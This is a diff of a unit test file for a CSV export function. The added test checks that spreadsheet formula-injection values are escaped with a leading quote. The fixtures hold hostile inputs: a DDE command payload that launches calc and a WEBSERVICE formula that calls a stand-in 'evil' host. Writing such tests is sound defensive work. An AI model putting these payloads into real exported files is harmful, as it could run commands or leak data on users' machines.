@@ -61,7 +61,23 @@ describe('buildModelsCsv（E2 导出）', () => {
   it('缺省字段输出为空（params 为 null 时不抛错）', () => {
     const csv = buildModelsCsv([{ id: 'x', name: 'b', type: 'other', params: null }])
     const lines = csv.replace(/^\uFEFF/, '').trimEnd().split('\n')
-    expect(lines[1]).toBe('b,,other,,,,,,,,,,,,,,,x')
+    // 22 列（F4 扩列后）：baseModel/author 在分类标签后，封面数在修改时间后（缺省为 0），所在目录在备注后
+    expect(lines[1]).toBe('b,,other,,,,,,,,,,,,,,,,0,,,x')
+  })
+
+  it('危险公式前缀字段前置单引号（O7：Excel 公式注入防护）', () => {
+    const csv = buildModelsCsv([
+      { id: 'D:/m/=cmd.safetensors', name: '=cmd|"/c calc"!A0.safetensors', alias: '+SUM(A1:A2)', note: '@WEBSERVICE("http://evil")', params: null },
+      { id: 'D:/m/normal.safetensors', name: 'normal.safetensors', alias: '普通备注', note: '-1 也会被转义', params: null }
+    ])
+    const lines = csv.replace(/^\uFEFF/, '').trimEnd().split('\n')
+    // = + - @ 开头的字段全部前置单引号，Excel 按纯文本呈现而非执行公式
+    expect(lines[1]).toContain("'=cmd")
+    expect(lines[1]).toContain("'+SUM")
+    expect(lines[1]).toContain("'@WEBSERVICE")
+    expect(lines[2]).toContain("'-1")
+    // 普通前缀（如字母）不受影响
+    expect(lines[2]).toContain('normal.safetensors')
   })
 })
 
